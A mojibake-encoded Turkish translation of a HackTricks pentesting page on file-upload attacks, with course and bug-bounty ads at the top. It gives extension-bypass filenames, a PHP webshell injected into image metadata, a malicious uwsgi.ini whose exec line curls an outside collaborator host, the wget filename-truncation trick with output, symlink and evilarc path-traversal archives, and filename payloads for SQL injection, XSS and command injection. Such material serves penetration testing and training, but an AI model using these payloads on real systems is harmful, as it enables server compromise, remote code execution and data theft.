# Dosya YÃ¼kleme

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **pull request** gÃ¶ndererek paylaÅŸÄ±n.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty ipucu**: **Hackerlar tarafÄ±ndan oluÅŸturulan premium bir hata Ã¶dÃ¼lÃ¼ platformu olan** **Intigriti'ye kaydolun**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Dosya YÃ¼kleme Genel Metodolojisi

DiÄŸer kullanÄ±ÅŸlÄ± uzantÄ±lar:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8'de Ã§alÄ±ÅŸma**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Sunucusu**: _.yaws_

### UzantÄ± kontrolÃ¼nÃ¼ atlatma

1. EÄŸer varsa, **Ã¶nceki uzantÄ±larÄ± kontrol edin**. AyrÄ±ca, bazÄ± **bÃ¼yÃ¼k harfli harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _Ã‡alÄ±ÅŸtÄ±rma uzantÄ±sÄ±ndan Ã¶nce geÃ§erli bir uzantÄ± eklemeyi deneyin (Ã¶nceki uzantÄ±larÄ± da kullanÄ±n):_
* _file.png.php_
* _file.png.Php5_
3. **Sonuna Ã¶zel karakterler eklemeyi** deneyin. Burp'u kullanarak tÃ¼m **ascii** ve **Unicode** karakterlerini **brute force** yapabilirsiniz. (_Ã–nceki uzantÄ±larÄ± da kullanmayÄ± deneyebilirsiniz_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. **UzantÄ±yÄ± iki katÄ±na Ã§Ä±karmak** veya uzantÄ±lar arasÄ±na **gereksiz veri** (**null** baytlarÄ±) ekleyerek sunucu tarafÄ±ndaki **uzantÄ± ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ± yanÄ±ltmayÄ±** deneyin. _Daha iyi bir payload hazÄ±rlamak iÃ§in **Ã¶nceki uzantÄ±larÄ±** de kullanabilirsiniz._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Ã–nceki kontrol iÃ§in **baÅŸka bir katman uzantÄ±sÄ±** ekleyin:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **GeÃ§erli uzantÄ±dan Ã¶nce exec uzantÄ±sÄ±nÄ±** ekleyin ve sunucunun yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ olmasÄ±nÄ± umun. (Apache yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±ÅŸlÄ±dÄ±r, burada uzantÄ±sÄ± **.php** olan herhangi bir ÅŸey, ancak .php ile bitmeyen herhangi bir ÅŸey kodu Ã§alÄ±ÅŸtÄ±racaktÄ±r):
* _Ã¶rn: file.php.png_
7. **Windows'ta NTFS alternatif veri akÄ±ÅŸÄ± (ADS)** kullanÄ±n. Bu durumda, yasaklanmÄ±ÅŸ bir uzantÄ±dan Ã¶nce ve izin verilen bir uzantÄ±dan sonra bir iki nokta karakteri ":" eklenir. SonuÃ§ olarak, sunucuda yasaklanmÄ±ÅŸ uzantÄ±ya sahip bir **boÅŸ dosya** oluÅŸturulur (Ã¶rneÄŸin "file.asax:.jpg"). Bu dosya daha sonra kÄ±sa dosya adÄ±nÄ± kullanarak dÃ¼zenlenebilir. "**::$data**" deseni ayrÄ±ca boÅŸ olmayan dosyalar oluÅŸturmak iÃ§in kullanÄ±labilir. Bu nedenle, bu desenin ardÄ±ndan bir nokta karakteri eklemek, daha fazla kÄ±sÄ±tlamayÄ± atlatmak iÃ§in de kullanÄ±ÅŸlÄ± olabilir (Ã¶rneÄŸin "file.asp::$data.")
8. Dosya adÄ± sÄ±nÄ±rlarÄ±nÄ± kÄ±rmayÄ± deneyin. GeÃ§erli uzantÄ± kesilir ve kÃ¶tÃ¼cÃ¼l PHP bÄ±rakÄ±lÄ±r. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 bayt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # burada 4 eksiltin ve .png ekleyin
# DosyayÄ± yÃ¼kleyin ve yanÄ±tÄ± kontrol edin, kaÃ§ karakter izin verdiÄŸini kontrol edin. Diyelim ki 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Payload'Ä± oluÅŸturun
AAA<--SNIP 232 A-->AAA.php.png
```
### Ä°Ã§erik TÃ¼rÃ¼, Sihirli SayÄ±, SÄ±kÄ±ÅŸtÄ±rma ve Yeniden BoyutlandÄ±rma Bypass Etme

* **Ä°Ã§erik TÃ¼rÃ¼** kontrolÃ¼nÃ¼ aÅŸmak iÃ§in **Content-Type** **baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini** ÅŸu ÅŸekilde ayarlayÄ±n: _image/png_, _text/plain_, application/octet-stream_
1. Ä°Ã§erik TÃ¼rÃ¼ **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **Sihirli sayÄ±** kontrolÃ¼nÃ¼ aÅŸmak iÃ§in dosyanÄ±n baÅŸÄ±na **gerÃ§ek bir resim dosyasÄ±nÄ±n baytlarÄ±nÄ±** ekleyin (_file_ komutunu yanÄ±ltmak iÃ§in). Veya **meta veriye** kabuk ekleyin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya payload'Ä± doÄŸrudan bir resme **yerleÅŸtirebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* EÄŸer resme **sÄ±kÄ±ÅŸtÄ±rma ekleniyorsa**, Ã¶rneÄŸin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi bazÄ± standart PHP kÃ¼tÃ¼phaneleri kullanÄ±larak, Ã¶nceki teknikler iÅŸe yaramaz. Bununla birlikte, **PLTE chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sÄ±kÄ±ÅŸtÄ±rmayÄ± **geÃ§ebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduÄŸu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web sayfasÄ± ayrÄ±ca resmi **yeniden boyutlandÄ±rarak** da kullanabilir, Ã¶rneÄŸin PHP-GD fonksiyonlarÄ± `imagecopyresized` veya `imagecopyresampled` kullanarak. Bununla birlikte, **IDAT chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sÄ±kÄ±ÅŸtÄ±rmayÄ± **geÃ§ebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduÄŸu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Resmin **yeniden boyutlandÄ±rÄ±lmasÄ±nÄ± saÄŸlamak iÃ§in** baÅŸka bir teknik, PHP-GD fonksiyonu `thumbnailImage` kullanmaktÄ±r. Bununla birlikte, **tEXt chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sÄ±kÄ±ÅŸtÄ±rmayÄ± **geÃ§ebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduÄŸu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### DiÄŸer Kontrol YÃ¶ntemleri

* DosyanÄ±n adÄ±nÄ± deÄŸiÅŸtirmek iÃ§in bir zafiyet bulun (uzantÄ±yÄ± deÄŸiÅŸtirmek iÃ§in).
* **Yerel Dosya Dahil Etme** zafiyeti bulun ve arka kapÄ±yÄ± Ã§alÄ±ÅŸtÄ±rÄ±n.
* **OlasÄ± Bilgi SÄ±zdÄ±rma**:
1. **AynÄ± dosyayÄ±** **aynÄ± isimle** **birkaÃ§ kez** (ve **aynÄ± anda**) yÃ¼kleyin.
2. **Zaten var olan bir dosya** veya **dizin** adÄ±yla bir dosya yÃ¼kleyin.
3. **â€œ.â€, â€œ..â€, veya â€œâ€¦â€** adÄ±nda bir dosya yÃ¼kleyin. Ã–rneÄŸin, Apache'de **Windows** Ã¼zerinde, uygulama yÃ¼klenen dosyalarÄ± â€œ/www/uploads/â€ dizininde saklÄ±yorsa, â€œ.â€ dosya adÄ± â€œ/www/â€ dizininde â€œuploadsâ€ adÄ±nda bir dosya oluÅŸturur.
4. **NTFS**'de **â€œâ€¦:.jpgâ€** gibi kolayca silinemeyen bir dosya yÃ¼kleyin. (Windows)
5. Ä°sminde `|<>*?â€` gibi **geÃ§ersiz karakterler** bulunan bir dosya yÃ¼kleyin. (Windows)
6. **Windows**'da CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9 gibi **yasaklanmÄ±ÅŸ** (**yasak**) **isimler** kullanarak bir dosya yÃ¼kleyin.
* AyrÄ±ca, yanlÄ±ÅŸlÄ±kla aÃ§Ä±ldÄ±ÄŸÄ±nda kodu **Ã§alÄ±ÅŸtÄ±racak** bir **yÃ¼rÃ¼tÃ¼lebilir** (.exe) veya **.html** (daha az ÅŸÃ¼pheli) dosya da **yÃ¼klemeyi deneyin**.

### Ã–zel uzantÄ± hileleri

EÄŸer dosyalarÄ± bir **PHP sunucusuna** yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in **.htaccess** hilesine gÃ¶z atÄ±n](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
EÄŸer dosyalarÄ± bir **ASP sunucusuna** yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kodun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in **.config** hilesine gÃ¶z atÄ±n](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyalarÄ±, java iÃ§in `.jar` gibi, ancak php iÃ§in kullanÄ±lÄ±r ve bir php dosyasÄ± gibi **kullanÄ±labilir** (php ile Ã§alÄ±ÅŸtÄ±rarak veya bir betik iÃ§ine dahil ederek...)

`.inc` uzantÄ±sÄ± bazen sadece dosyalarÄ± **ithal etmek** iÃ§in kullanÄ±lan php dosyalarÄ± iÃ§in kullanÄ±lÄ±r, bu yÃ¼zden bir noktada, **bu uzantÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin verilmiÅŸ** olabilir.

## **Jetty RCE**

EÄŸer bir Jetty sunucusuna bir XML dosyasÄ± yÃ¼kleyebiliyorsanÄ±z, [RCE elde edebilirsiniz Ã§Ã¼nkÃ¼ **yeni \*.xml ve \*.war otomatik olarak iÅŸlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu nedenle, aÅŸaÄŸÄ±daki resimde belirtildiÄŸi gibi XML dosyasÄ±nÄ± `$JETTY_BASE/webapps/` dizinine yÃ¼kleyin ve kabuÄŸu bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Bu zafiyetin ayrÄ±ntÄ±lÄ± bir keÅŸfi iÃ§in orijinal araÅŸtÄ±rmaya bakÄ±n: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Uzaktan Komut YÃ¼rÃ¼tme (RCE) zafiyetleri, birinin `.ini` yapÄ±landÄ±rma dosyasÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸi varsa uWSGI sunucularÄ±nda istismar edilebilir. uWSGI yapÄ±landÄ±rma dosyalarÄ±, "sihirli" deÄŸiÅŸkenler, yer tutucular ve operatÃ¶rler iÃ§eren belirli bir sÃ¶zdizimini kullanÄ±r. Ã–zellikle, `@(filename)` olarak kullanÄ±lan '@' operatÃ¶rÃ¼, bir dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. uWSGI'de desteklenen Ã§eÅŸitli ÅŸemalardan, "exec" ÅŸemasÄ± Ã¶zellikle gÃ¼Ã§lÃ¼dÃ¼r ve bir iÅŸlemin standart Ã§Ä±ktÄ±sÄ±ndan veri okumayÄ± saÄŸlar. Bu Ã¶zellik, `.ini` yapÄ±landÄ±rma dosyasÄ± iÅŸlendiÄŸinde Uzaktan Komut YÃ¼rÃ¼tme veya Keyfi Dosya Yazma/Okuma gibi kÃ¶tÃ¼ amaÃ§lÄ± amaÃ§lar iÃ§in manipÃ¼le edilebilir.

AÅŸaÄŸÄ±daki zararlÄ± `uwsgi.ini` dosyasÄ± Ã¶rneÄŸi, Ã§eÅŸitli ÅŸemalarÄ± sergileyerek bu konuyu gÃ¶stermektedir:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'in yÃ¼rÃ¼tÃ¼lmesi, yapÄ±landÄ±rma dosyasÄ±nÄ±n ayrÄ±ÅŸtÄ±rÄ±lmasÄ± sÄ±rasÄ±nda gerÃ§ekleÅŸir. YapÄ±landÄ±rmanÄ±n etkinleÅŸtirilmesi ve ayrÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in uWSGI iÅŸlemi yeniden baÅŸlatÄ±lmalÄ±dÄ±r (olasÄ± bir Ã§Ã¶kme veya Hizmet Reddi saldÄ±rÄ±sÄ± sonrasÄ±nda) veya dosya otomatik yeniden yÃ¼kleme olarak ayarlanmalÄ±dÄ±r. Otomatik yeniden yÃ¼kleme Ã¶zelliÄŸi etkinleÅŸtirilmiÅŸse, deÄŸiÅŸiklikler algÄ±landÄ±ÄŸÄ±nda belirtilen aralÄ±klarla dosya yeniden yÃ¼klenir.

uWSGI'nin yapÄ±landÄ±rma dosyasÄ± ayrÄ±ÅŸtÄ±rmasÄ±nÄ±n gevÅŸek doÄŸasÄ±nÄ± anlamak Ã¶nemlidir. Ã–zellikle, tartÄ±ÅŸÄ±lan payload bir ikili dosyaya (Ã¶rneÄŸin bir resim veya PDF) yerleÅŸtirilebilir, bu da potansiyel istismar alanÄ±nÄ± geniÅŸletir.

## **wget Dosya YÃ¼kleme/SSRF Hilesi**

BazÄ± durumlarda bir sunucunun **`wget`** kullanarak **dosyalarÄ± indirdiÄŸini** ve **URL'yi** belirtebileceÄŸinizi fark edebilirsiniz. Bu durumlarda, kodun indirilen dosyalarÄ±n uzantÄ±sÄ±nÄ±n bir beyaz listeye dahil olduÄŸunu kontrol ettiÄŸini ve yalnÄ±zca izin verilen dosyalarÄ±n indirileceÄŸini saÄŸladÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz. Bununla birlikte, **bu kontrol atlatÄ±labilir.**\
**Linux**'ta bir **dosya adÄ±nÄ±n** maksimum uzunluÄŸu **255**'tir, ancak **wget** dosya adlarÄ±nÄ± **236** karaktere kÄ±saltÄ±r. **"A"\*232+".php"+".gif"** adÄ±nda bir dosya indirebilirsiniz, bu dosya adÄ± **kontrolÃ¼ atlayacak** (bu Ã¶rnekte **".gif"** geÃ§erli bir uzantÄ±dÄ±r) ancak `wget` dosyayÄ± **"A"\*232+".php"** olarak yeniden adlandÄ±racaktÄ±r.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Bu kontrolÃ¼ atlamak iÃ§in dÃ¼ÅŸÃ¼nebileceÄŸiniz **baÅŸka bir seÃ§enek**, **HTTP sunucusunun farklÄ± bir dosyaya yÃ¶nlendirmesini saÄŸlamaktÄ±r**, bÃ¶ylece baÅŸlangÄ±Ã§taki URL, wget yeni adÄ±yla yÃ¶nlendirilen dosyayÄ± indirecektir. Bu, wget'in **--trust-server-names** parametresiyle kullanÄ±ldÄ±ÄŸÄ± **sÃ¼rece Ã§alÄ±ÅŸmayacaktÄ±r**, Ã§Ã¼nkÃ¼ wget, yÃ¶nlendirilen sayfayÄ± orijinal URL'de belirtilen dosya adÄ±yla indirecektir.


## AraÃ§lar

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass), dosya yÃ¼kleme mekanizmalarÄ±nÄ± test etmek iÃ§in tasarlanmÄ±ÅŸ gÃ¼Ã§lÃ¼ bir araÃ§tÄ±r. Web uygulamalarÄ±nÄ±n kapsamlÄ± bir ÅŸekilde deÄŸerlendirilmesini saÄŸlayarak, zayÄ±flÄ±klarÄ±n tespit edilmesi ve istismar edilmesi sÃ¼recini basitleÅŸtirmek iÃ§in Ã§eÅŸitli hata avÄ± tekniklerinden yararlanÄ±r.

## Dosya yÃ¼klemesinden diÄŸer zayÄ±flÄ±klara

* **Dosya adÄ±nÄ±** `../../../tmp/lol.png` olarak ayarlayÄ±n ve **yol geÃ§idi** elde etmeye Ã§alÄ±ÅŸÄ±n
* **Dosya adÄ±nÄ±** `sleep(10)-- -.jpg` olarak ayarlayÄ±n ve **SQL enjeksiyonu** elde edebilirsiniz
* **Dosya adÄ±nÄ±** `<svg onload=alert(document.domain)>` olarak ayarlayarak XSS elde edin
* **Dosya adÄ±nÄ±** `; sleep 10;` olarak ayarlayarak bazÄ± komut enjeksiyonlarÄ±nÄ± test edin (daha fazla [komut enjeksiyonu hileleri burada](../command-injection.md))
* [Resim (svg) dosyasÄ±nda **XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** dosyasÄ± **yÃ¼kleme** + **XSS** = [**Service Workers** istismarÄ±](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svg yÃ¼klemede **XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [svg dosyasÄ± yÃ¼kleyerek **AÃ§Ä±k YÃ¶nlendirme**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinden **farklÄ± svg payloadlarÄ±** deneyin
* ÃœnlÃ¼ **ImageTrick** zayÄ±flÄ±ÄŸÄ± [burada](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Web sunucusuna bir URL'den bir resmi yakalamasÄ± iÃ§in iÅŸaretleyebilirseniz, [SSRF](../ssrf-server-side-request-forgery/)yi istismar etmeyi deneyebilirsiniz. Bu **resim**, bazÄ± **genel** bir siteye **kaydedilecekse**, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirtebilir ve her ziyaretÃ§inin bilgilerini **Ã§alabilirsiniz**.
* [PDF-Adobe yÃ¼kleme ile **XXE ve CORS** atlatma](pdf-upload-xxe-and-cors-bypass.md)
* XSS iÃ§in Ã¶zel olarak oluÅŸturulmuÅŸ PDF'ler: [AÅŸaÄŸÄ±daki sayfa, JS yÃ¼rÃ¼tme elde etmek iÃ§in PDF verilerini enjekte etme](../xss-cross-site-scripting/pdf-injection.md) yÃ¶ntemini gÃ¶stermektedir. PDF'ler yÃ¼kleyebiliyorsanÄ±z, verilen talimatlara uyarak keyfi JS yÃ¼rÃ¼ten bir PDF hazÄ±rlayabilirsiniz.
* Sunucunun herhangi bir **antivirÃ¼s** olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) iÃ§eriÄŸini yÃ¼kleyin
* Dosya yÃ¼kleme sÄ±rasÄ±nda herhangi bir **boyut sÄ±nÄ±rÄ±** olup olmadÄ±ÄŸÄ±nÄ± kontrol edin

Ä°ÅŸte yÃ¼kleyerek elde edebileceÄŸiniz 10 ÅŸeyin bir listesi (buradan alÄ±nmÄ±ÅŸtÄ±r: [buradan](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: DepolanmÄ±ÅŸ XSS / SSRF / XXE
3. **GIF**: DepolanmÄ±ÅŸ XSS / SSRF
4. **CSV**: CSV enjeksiyonu
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML enjeksiyonu / XSS / AÃ§Ä±k yÃ¶nlendirme
8. **PNG / JPEG**: Piksel sel saldÄ±rÄ±sÄ± (DoS)
9. **ZIP**: LFI aracÄ±lÄ±ÄŸÄ±yla RCE / DoS
10. **PDF / PPTX**: SSRF / KÃ–R XXE

#### Burp UzantÄ±sÄ±

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Sihirli BaÅŸlÄ±k BaytlarÄ±

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

DiÄŸer dosya tÃ¼rleri iÃ§in [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) adresine bakÄ±n.

### Otomatik olarak aÃ§Ä±lan Zip/Tar DosyasÄ± YÃ¼kleme

Sunucu iÃ§inde aÃ§Ä±lacak bir ZIP yÃ¼kleyebiliyorsanÄ±z, 2 ÅŸey yapabilirsiniz:

#### Sembolik baÄŸlantÄ±

DiÄŸer dosyalara sembolik baÄŸlantÄ±lar iÃ§eren bir baÄŸlantÄ± yÃ¼kleyin, ardÄ±ndan aÃ§Ä±lan dosyalara eriÅŸerek baÄŸlantÄ±lÄ± dosyalara eriÅŸeceksiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### FarklÄ± klasÃ¶rlere aÃ§ma

AÃ§ma iÅŸlemi sÄ±rasÄ±nda dosyalarÄ±n beklenmedik ÅŸekilde dizinlere oluÅŸturulmasÄ± Ã¶nemli bir sorundur. Ä°lk baÅŸta, bu yapÄ±landÄ±rmanÄ±n kÃ¶tÃ¼ niyetli dosya yÃ¼klemeleri aracÄ±lÄ±ÄŸÄ±yla iÅŸletim sistemi dÃ¼zeyinde komut yÃ¼rÃ¼tme saldÄ±rÄ±larÄ±na karÅŸÄ± koruma saÄŸlayabileceÄŸi dÃ¼ÅŸÃ¼nÃ¼lse de, ZIP arÅŸiv formatÄ±nÄ±n hiyerarÅŸik sÄ±kÄ±ÅŸtÄ±rma desteÄŸi ve dizin gezinme yetenekleri kÃ¶tÃ¼ niyetli kiÅŸiler tarafÄ±ndan istismar edilebilir. Bu, saldÄ±rganlarÄ±n hedef uygulamanÄ±n aÃ§ma iÅŸlevselliÄŸini manipÃ¼le ederek kÄ±sÄ±tlamalarÄ± atlamasÄ±na ve gÃ¼venli yÃ¼kleme dizinlerinden kaÃ§masÄ±na olanak tanÄ±r.

Bu tÃ¼r dosyalarÄ± oluÅŸturmak iÃ§in otomatik bir saldÄ±rÄ± aracÄ± [**GitHub'da evilarc**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. YardÄ±mcÄ± program aÅŸaÄŸÄ±daki gibi kullanÄ±labilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
